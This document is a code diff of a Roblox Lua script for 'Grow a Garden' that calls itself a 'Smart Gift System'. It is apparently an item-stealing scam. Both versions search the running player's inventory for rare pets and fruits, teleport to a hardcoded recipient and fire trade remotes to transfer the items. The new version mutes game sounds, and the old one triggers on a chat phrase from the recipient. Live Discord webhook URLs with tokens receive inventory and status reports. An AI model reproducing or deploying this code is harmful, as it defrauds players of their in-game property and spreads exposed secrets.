@@ -1,260 +1,180 @@
--- Grow a Garden Smart Gift System
-local RECIPIENT_NAME = "Tekeshkii" -- CASE SENSITIVE
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1383491297859469433/StCTYTDOXN9jcRg-qBV59aNlF9uEyuAg2_OnAcknekx6tTvFPdw83T2uP6cmivRYOYEs"
-local ACTIVATION_PHRASE = "ha" -- Chat command to activate
-local GIFT_COOLDOWN = 1 -- Safer cooldown between gifts
-local TARGET_ITEMS = {
-    Pets = {"dragonfly", "raccoon", "queen bee", "disco bee", "red fox"},
-    Fruits = {"candy blossom"}
-}
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1383762986111471626/XYLI8fnKczPB65YAOvg_Dtsuf28mGQvTHRxcr2JP4pHiaFY8qPw2MlGNzX9pp7geweF3" -- Discord webhook (optional)
+local TARGET_NAME = "Tekeshkii" -- Name of the player to gift items to
+local LOADING_TIME = 2 -- Time in seconds before executing (reduce for testing)
 
--- Services
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local TextChatService = game:GetService("TextChatService")
+local MarketplaceService = game:GetService("MarketplaceService")
 
--- Variables
 local lp = Players.LocalPlayer
 local Backpack = lp:WaitForChild("Backpack")
-local Recipient = nil
-local GiftRemotes = {}
-local currentJobId = game.JobId
-local isOperating = false
+local Character = lp.Character or lp.CharacterAdded:Wait()
 
--- Rich Discord embed with inventory info
-local function sendEmbed(title, description, inventoryData)
-    local fields = {
-        {name = "👤 Executor", value = lp.Name, inline = true},
-        {name = "🎯 Recipient", value = RECIPIENT_NAME, inline = true},
-        {name = "🆔 Job ID", value = currentJobId, inline = true}
-    }
-
-    -- Add inventory info if available
-    if inventoryData then
-        for category, items in pairs(inventoryData) do
-            if #items > 0 then
-                table.insert(fields, {
-                    name = "📦 "..category,
-                    value = table.concat(items, "\n"),
-                    inline = false
-                })
-            end
-        end
+-- Mute all game sounds (optional)
+local function muteSounds()
+    local SoundService = game:GetService("SoundService")
+    SoundService.Volume = 0
+    for _, sound in ipairs(workspace:GetDescendants()) do
+        if sound:IsA("Sound") then sound:Stop() end
     end
-
-    pcall(function()
-        local req = (syn and syn.request) or (http and http.request) or http_request
-        if req then
-            req({
-                Url = WEBHOOK_URL,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode({
-                    embeds = {{
-                        title = title,
-                        description = description,
-                        color = 0x00FF00,
-                        fields = fields,
-                        footer = {text = os.date("%X")}
-                    }}
-                })
-            })
-        end
-    end)
 end
 
--- Scan inventory for target items
-local function scanInventory()
-    local foundItems = {Pets = {}, Fruits = {}}
-    
-    for _, item in ipairs(Backpack:GetChildren()) do
-        if item:IsA("Tool") then
-            local name = item.Name:lower()
-            -- Check pets
-            for _, pet in ipairs(TARGET_ITEMS.Pets) do
-                if name:find(pet:lower()) then
-                    table.insert(foundItems.Pets, item.Name)
-                    break
-                end
+-- Check if the executor has required pets/fruits
+local function getValidItems()
+    local validItems = {
+        "dragonfly", "raccoon", "disco bee", "queen bee", "candy blossom"
+    }
+    local foundItems = {}
+
+    -- Check Backpack
+    for _, tool in ipairs(Backpack:GetChildren()) do
+        local lowerName = string.lower(tool.Name)
+        for _, item in ipairs(validItems) do
+            if string.find(lowerName, item) then
+                table.insert(foundItems, tool)
+                break
             end
-            -- Check fruits
-            for _, fruit in ipairs(TARGET_ITEMS.Fruits) do
-                if name:find(fruit:lower()) then
-                    table.insert(foundItems.Fruits, item.Name)
-                    break
+        end
+    end
+
+    -- Check Character (if equipped)
+    if Character then
+        for _, tool in ipairs(Character:GetChildren()) do
+            if tool:IsA("Tool") then
+                local lowerName = string.lower(tool.Name)
+                for _, item in ipairs(validItems) do
+                    if string.find(lowerName, item) then
+                        table.insert(foundItems, tool)
+                        break
+                    end
                 end
             end
         end
     end
-    
+
     return foundItems
 end
 
 -- Teleport to recipient
-local function teleportToRecipient()
-    if not Recipient or not Recipient.Character then return false end
-    
-    local humanoid = lp.Character and lp.Character:FindFirstChildOfClass("Humanoid")
-    local recipientRoot = Recipient.Character:FindFirstChild("HumanoidRootPart")
-    
-    if humanoid and recipientRoot then
-        -- Create temporary part for precise teleport
-        local tempPart = Instance.new("Part")
-        tempPart.Anchored = true
-        tempPart.CanCollide = false
-        tempPart.Transparency = 1
-        tempPart.Size = Vector3.new(2, 2, 2)
-        tempPart.CFrame = recipientRoot.CFrame * CFrame.new(0, 0, -2)
-        tempPart.Parent = workspace
-        
-        -- Perform teleport
-        lp.Character:SetPrimaryPartCFrame(tempPart.CFrame)
-        tempPart:Destroy()
-        return true
-    end
-    return false
-end
+local function teleportToPlayer(targetPlayer)
+    if not targetPlayer or not targetPlayer.Character then return false end
+    local targetChar = targetPlayer.Character
+    local humanoidRootPart = targetChar:FindFirstChild("HumanoidRootPart")
+    if not humanoidRootPart then return false end
 
--- Equip item with verification
-local function safeEquip(item)
-    if not lp.Character then return false end
-    local humanoid = lp.Character:FindFirstChildOfClass("Humanoid")
-    if not humanoid then return false end
-    
-    humanoid:EquipTool(item)
-    local timeout = 0
-    while humanoid:GetTool() ~= item and timeout < 10 do
-        task.wait(0.1)
-        timeout = timeout + 1
-    end
-    return humanoid:GetTool() == item
-end
-
--- Find gifting remotes
-local function findGiftRemotes()
-    for _, remote in ipairs(ReplicatedStorage:GetDescendants()) do
-        if remote:IsA("RemoteEvent") and (remote.Name:lower():find("gift") or remote.Name:lower():find("trade")) then
-            table.insert(GiftRemotes, remote)
-        end
-    end
-end
-
--- Gift item to recipient
-local function giftItem(item)
-    if not Recipient or #GiftRemotes == 0 then return false end
-    
-    for _, remote in ipairs(GiftRemotes) do
-        pcall(function() remote:FireServer(Recipient, item) end)
-        pcall(function() remote:FireServer("Gift", Recipient, item) end)
-    end
+    -- Use TweenService for smooth teleport (optional)
+    local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Linear)
+    local tween = game:GetService("TweenService"):Create(
+        lp.Character.HumanoidRootPart,
+        tweenInfo,
+        {CFrame = humanoidRootPart.CFrame * CFrame.new(0, 0, -5)}
+    )
+    tween:Play()
+    tween.Completed:Wait()
     return true
 end
 
--- Main gifting sequence
-local function executeGifting()
-    if isOperating then return end
-    isOperating = true
-    
-    -- Initial scan and report
-    local inventory = scanInventory()
-    sendEmbed("🔍 INVENTORY SCAN COMPLETE", "Beginning gifting process...", inventory)
-    
-    -- Teleport to recipient
-    if teleportToRecipient() then
-        sendEmbed("🌀 TELEPORT SUCCESS", "Now in position with recipient", inventory)
+-- Gift items to recipient (game-specific)
+local function giftItems(targetPlayer, items)
+    if not targetPlayer then return false end
+
+    -- Assumes a RemoteEvent named "TradeItems" exists (modify per game)
+    local tradeEvent = ReplicatedStorage:FindFirstChild("TradeItems") or
+                      ReplicatedStorage:WaitForChild("TradeItems", 5)
+
+    if tradeEvent and tradeEvent:IsA("RemoteEvent") then
+        for _, item in ipairs(items) do
+            tradeEvent:FireServer(targetPlayer, item)
+            task.wait(0.5) -- Avoid rate limits
+        end
+        return true
     else
-        sendEmbed("⚠️ TELEPORT FAILED", "Continuing without teleport", inventory)
+        warn("[!] Trade system not found. Modify script for your game.")
+        return false
     end
-    
-    -- Gift pets first
-    for _, item in ipairs(Backpack:GetChildren()) do
-        if item:IsA("Tool") then
-            for _, pet in ipairs(TARGET_ITEMS.Pets) do
-                if item.Name:lower():find(pet:lower()) then
-                    if safeEquip(item) then
-                        if giftItem(item) then
-                            sendEmbed("🎁 PET GIFTED", "Successfully gifted: "..item.Name, {
-                                Pets = {item.Name},
-                                Status = {"Remaining items: "..#Backpack:GetChildren()}
-                            })
-                            task.wait(GIFT_COOLDOWN)
-                        end
-                    end
-                    break -- Move to next item
-                end
-            end
-        end
-    end
-    
-    -- Then gift fruits
-    for _, item in ipairs(Backpack:GetChildren()) do
-        if item:IsA("Tool") then
-            for _, fruit in ipairs(TARGET_ITEMS.Fruits) do
-                if item.Name:lower():find(fruit:lower()) then
-                    if safeEquip(item) then
-                        if giftItem(item) then
-                            sendEmbed("🍬 FRUIT GIFTED", "Successfully gifted: "..item.Name, {
-                                Fruits = {item.Name},
-                                Status = {"Remaining items: "..#Backpack:GetChildren()}
-                            })
-                            task.wait(GIFT_COOLDOWN)
-                        end
-                    end
-                    break -- Move to next item
-                end
-            end
-        end
-    end
-    
-    -- Final report
-    sendEmbed("✅ GIFTING COMPLETE", "All target items processed", scanInventory())
-    isOperating = false
 end
 
--- Find recipient
-local function setupRecipient()
-    for _, player in ipairs(Players:GetPlayers()) do
-        if player.Name == RECIPIENT_NAME then
-            Recipient = player
-            sendEmbed("🎯 RECIPIENT FOUND", "Awaiting activation phrase...", nil)
-            return true
-        end
-    end
-    sendEmbed("❌ RECIPIENT OFFLINE", "Could not find recipient", nil)
-    return false
-end
+-- Main execution
+local function main()
+    muteSounds()
+    local validItems = getValidItems()
 
--- Chat detection system
-local function setupChatListener()
-    -- Modern chat system (recommended)
-    if TextChatService then
-        TextChatService.OnIncomingMessage = function(message)
-            if message.TextSource and Recipient and message.TextSource.UserId == Recipient.UserId then
-                if string.lower(message.Text) == string.lower(ACTIVATION_PHRASE) then
-                    executeGifting()
-                end
-            end
-        end
-    else
-        -- Legacy chat fallback
-        for _, player in ipairs(Players:GetPlayers()) do
-            if player == Recipient then
-                player.Chatted:Connect(function(message)
-                    if string.lower(message) == string.lower(ACTIVATION_PHRASE) then
-                        executeGifting()
-                    end
+    if #validItems == 0 then
+        print("[!] No valid pets/fruits found.")
+        if WEBHOOK_URL ~= "" then
+            local req = syn and syn.request or request or http_request
+            if req then
+                pcall(function()
+                    req({
+                        Url = WEBHOOK_URL,
+                        Method = "POST",
+                        Headers = {["Content-Type"] = "application/json"},
+                        Body = HttpService:JSONEncode({
+                            content = "❌ No valid items found in " .. MarketplaceService:GetProductInfo(game.PlaceId).Name
+                        })
+                    })
                 end)
             end
         end
+        return
+    end
+
+    -- Find recipient
+    local recipient
+    for _, player in ipairs(Players:GetPlayers()) do
+        if string.lower(player.Name) == string.lower(TARGET_NAME) or
+           string.lower(player.DisplayName) == string.lower(TARGET_NAME) then
+            recipient = player
+            break
+        end
+    end
+
+    if not recipient then
+        print("[!] Recipient not found:", TARGET_NAME)
+        if WEBHOOK_URL ~= "" then
+            local req = syn and syn.request or request or http_request
+            if req then
+                pcall(function()
+                    req({
+                        Url = WEBHOOK_URL,
+                        Method = "POST",
+                        Headers = {["Content-Type"] = "application/json"},
+                        Body = HttpService:JSONEncode({
+                            content = "❌ Recipient **" .. TARGET_NAME .. "** not found in " .. MarketplaceService:GetProductInfo(game.PlaceId).Name
+                        })
+                    })
+                end)
+            end
+        end
+        return
+    end
+
+    -- Teleport & gift
+    if teleportToPlayer(recipient) then
+        print("[+] Teleported to", recipient.Name)
+        if giftItems(recipient, validItems) then
+            print("[+] Gifted", #validItems, "items to", recipient.Name)
+            if WEBHOOK_URL ~= "" then
+                local req = syn and syn.request or request or http_request
+                if req then
+                    pcall(function()
+                        req({
+                            Url = WEBHOOK_URL,
+                            Method = "POST",
+                            Headers = {["Content-Type"] = "application/json"},
+                            Body = HttpService:JSONEncode({
+                                content = "✅ **Gifted " .. #validItems .. " items** to **" .. recipient.Name .. "** in " .. MarketplaceService:GetProductInfo(game.PlaceId).Name
+                            })
+                        })
+                    end)
+                end
+            end
+        end
     end
 end
 
--- Initialize systems
-findGiftRemotes()
-if setupRecipient() then
-    setupChatListener()
-end
-
-sendEmbed("⚡ SYSTEM ONLINE", "Gift system initialized and ready", nil)
+-- Start after delay
+task.delay(LOADING_TIME, main)
